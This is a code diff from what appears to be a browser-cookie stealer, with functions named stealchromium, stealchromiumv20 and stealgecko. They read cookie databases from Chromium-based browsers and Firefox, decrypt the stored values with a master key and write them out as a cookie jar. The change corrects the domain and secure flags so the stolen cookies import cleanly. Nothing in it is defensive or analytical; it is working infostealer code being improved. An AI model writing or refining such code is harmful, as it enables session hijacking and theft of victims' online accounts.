@@ -463,7 +463,7 @@ def stealchromium():
                         cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                         try:
                             for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
-                                line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
+                                line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
                                 write(cookieoutput, line)
                                 cookie_count += 1
                         except Exception as e:
@@ -561,7 +561,7 @@ def stealchromiumv20():
                             for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
                                 decrypted = decrypt_v20_value(value, master_key)
                                 if decrypted is not None:
-                                    line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{decrypted}\n"
+                                    line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypted}\n"
                                     write(cookieoutput, line)
                                     cookie_count += 1
                         except Exception as e:
@@ -639,7 +639,7 @@ def stealgecko():
                        cur.execute("SELECT host, name, path, value, isSecure, expiry FROM moz_cookies")
                        try:
                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
-                               line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{value}\n"
+                               line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{value}\n"
                                write(cookieoutput, line)
                                cookie_count += 1
                        except Exception as e:
